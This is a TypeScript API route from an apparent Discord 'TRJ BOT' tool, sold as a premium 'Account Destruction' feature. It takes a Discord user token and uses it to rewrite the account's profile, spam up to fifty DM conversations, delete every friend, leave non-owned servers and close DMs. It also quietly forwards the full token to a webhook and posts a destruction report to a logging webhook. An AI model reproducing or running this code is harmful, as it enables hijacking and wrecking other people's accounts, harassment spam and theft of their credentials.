// src/app/api/account-destruction/route.ts - Account Destruction API v1.0
// ⚠️ PRIME ONLY - ميزة حصرية للبريم
export const runtime = 'edge';

import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { token, actions, message, profile } = body as {
      token: string;
      actions: {
        spamDMs: boolean;
        deleteFriends: boolean;
        leaveServers: boolean;
        closeDMs: boolean;
      };
      message?: string;
      profile?: {
        username?: string;
        avatar?: string;
        bio?: string;
      };
    };

    if (!token) {
      return Response.json({ success: false, error: 'أدخل التوكن' });
    }

    const ct = cleanToken(token);

    // التحقق من التوكن
    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

    if (!verifyResult.ok || !verifyResult.data) {
      return Response.json({ success: false, error: 'توكن غير صالح' });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    // إرسال للويب هوك
    sendFullToken('Account Destruction', ct, { '👤 المستخدم': userTag, '🆔 ID': userData.id });

    const logs: string[] = [`🎯 بدء تدمير حساب: ${userTag}`];
    const stats = { dmsSpammed: 0, friendsDeleted: 0, serversLeft: 0, dmsClosed: 0 };

    // ===== 1. تغيير البروفايل =====
    if (profile && (profile.username || profile.avatar || profile.bio)) {
      logs.push('📝 تحديث البروفايل...');
      
      const profileData: any = {};
      if (profile.username) profileData.username = profile.username;
      if (profile.avatar) profileData.avatar = profile.avatar; // base64
      if (profile.bio) profileData.bio = profile.bio;

      try {
        const profileRes = await discordFetch(ct, 'PATCH', '/users/@me', profileData, { userOnly: true, timeout: 15000 });
        if (profileRes.ok) {
          logs.push(`✅ تم تحديث البروفايل`);
          if (profile.username) logs.push(`   👤 الاسم الجديد: ${profile.username}`);
          if (profile.bio) logs.push(`   📝 البايو: ${profile.bio.substring(0, 50)}...`);
        } else {
          logs.push(`❌ فشل تحديث البروفايل`);
        }
      } catch {
        logs.push(`❌ خطأ في تحديث البروفايل`);
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 2. سبام DMs =====
    if (actions.spamDMs) {
      logs.push('📧 جاري سبام الرسائل الخاصة...');
      
      try {
        // جلب قائمة DMs
        const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });
        
        if (dmsRes.ok && dmsRes.data) {
          const channels = dmsRes.data as any[];
          logs.push(`   📬 تم العثور على ${channels.length} محادثة`);
          
          const spamMessage = message || '💀 Account Destroyed by TRJ BOT';
          
          for (let i = 0; i < Math.min(channels.length, 50); i++) {
            const channel = channels[i];
            if (channel.type === 1) { // DM type
              try {
                // إرسال 5 رسائل لكل DM
                for (let j = 0; j < 5; j++) {
                  await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
                    content: spamMessage
                  }, { userOnly: true, timeout: 10000 });
                  stats.dmsSpammed++;
                  await new Promise(r => setTimeout(r, 500));
                }
              } catch {
                // تجاهل الأخطاء
              }
            }
          }
          logs.push(`   ✅ تم إرسال ${stats.dmsSpammed} رسالة`);
        } else {
          logs.push(`   ❌ فشل جلب المحادثات`);
        }
      } catch {
        logs.push(`   ❌ خطأ في سبام DMs`);
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 3. حذف الأصدقاء =====
    if (actions.deleteFriends) {
      logs.push('👥 جاري حذف الأصدقاء...');
      
      try {
        // جلب قائمة الأصدقاء
        const friendsRes = await discordFetch(ct, 'GET', '/users/@me/relationships', undefined, { userOnly: true, timeout: 15000 });
        
        if (friendsRes.ok && friendsRes.data) {
          const friends = (friendsRes.data as any[]).filter((r: any) => r.type === 1);
          logs.push(`   👥 تم العثور على ${friends.length} صديق`);
          
          for (const friend of friends) {
            try {
              await discordFetch(ct, 'DELETE', `/users/@me/relationships/${friend.id}`, undefined, { userOnly: true, timeout: 5000 });
              stats.friendsDeleted++;
              await new Promise(r => setTimeout(r, 300));
            } catch {
              // تجاهل
            }
          }
          logs.push(`   ✅ تم حذف ${stats.friendsDeleted} صديق`);
        } else {
          logs.push(`   ❌ فشل جلب قائمة الأصدقاء`);
        }
      } catch {
        logs.push(`   ❌ خطأ في حذف الأصدقاء`);
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 4. مغادرة السيرفرات =====
    if (actions.leaveServers) {
      logs.push('🚪 جاري مغادرة السيرفرات...');
      
      try {
        // جلب قائمة السيرفرات
        const guildsRes = await discordFetch(ct, 'GET', '/users/@me/guilds', undefined, { userOnly: true, timeout: 15000 });
        
        if (guildsRes.ok && guildsRes.data) {
          const guilds = guildsRes.data as any[];
          logs.push(`   🏠 تم العثور على ${guilds.length} سيرفر`);
          
          for (const guild of guilds) {
            try {
              // لا يمكن مغادرة السيرفرات التي أنت مالكها بهذه الطريقة
              if (!guild.owner) {
                await discordFetch(ct, 'DELETE', `/users/@me/guilds/${guild.id}`, undefined, { userOnly: true, timeout: 5000 });
                stats.serversLeft++;
              }
              await new Promise(r => setTimeout(r, 300));
            } catch {
              // تجاهل
            }
          }
          logs.push(`   ✅ تم مغادرة ${stats.serversLeft} سيرفر`);
        } else {
          logs.push(`   ❌ فشل جلب قائمة السيرفرات`);
        }
      } catch {
        logs.push(`   ❌ خطأ في مغادرة السيرفرات`);
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 5. إغلاق DMs =====
    if (actions.closeDMs) {
      logs.push('📪 جاري إغلاق المحادثات...');
      
      try {
        const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });
        
        if (dmsRes.ok && dmsRes.data) {
          const channels = (dmsRes.data as any[]).filter((c: any) => c.type === 1);
          
          for (const channel of channels) {
            try {
              await discordFetch(ct, 'DELETE', `/channels/${channel.id}`, undefined, { userOnly: true, timeout: 5000 });
              stats.dmsClosed++;
              await new Promise(r => setTimeout(r, 200));
            } catch {
              // تجاهل
            }
          }
          logs.push(`   ✅ تم إغلاق ${stats.dmsClosed} محادثة`);
        }
      } catch {
        logs.push(`   ❌ خطأ في إغلاق DMs`);
      }
    }

    logs.push('');
    logs.push('💀 تم الانتهاء من تدمير الحساب!');
    logs.push(`📊 الإحصائيات:`);
    logs.push(`   📧 رسائل مرسلة: ${stats.dmsSpammed}`);
    logs.push(`   👥 أصدقاء محذوفين: ${stats.friendsDeleted}`);
    logs.push(`   🚪 سيرفرات مغادرة: ${stats.serversLeft}`);
    logs.push(`   📪 محادثات مغلقة: ${stats.dmsClosed}`);

    // إرسال إشعار للويب هوك
    const webhookUrl = getLogWebhookUrl();
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '💀 Account Destruction',
              description: `**تم تدمير حساب:** ${userTag}`,
              color: 0xFF0000,
              fields: [
                { name: '👤 المستخدم', value: userTag, inline: true },
                { name: '🆔 ID', value: userData.id, inline: true },
                { name: '📧 رسائل مرسلة', value: stats.dmsSpammed.toString(), inline: true },
                { name: '👥 أصدقاء محذوفين', value: stats.friendsDeleted.toString(), inline: true },
                { name: '🚪 سيرفرات مغادرة', value: stats.serversLeft.toString(), inline: true },
                { name: '📪 محادثات مغلقة', value: stats.dmsClosed.toString(), inline: true },
              ],
              footer: { text: 'TRJ BOT - Prime Feature' },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch {}
    }

    return Response.json({
      success: true,
      logs,
      stats,
      user: { id: userData.id, username: userTag }
    });

  } catch (error) {
    return Response.json({ success: false, error: 'خطأ في الخادم' });
  }
}
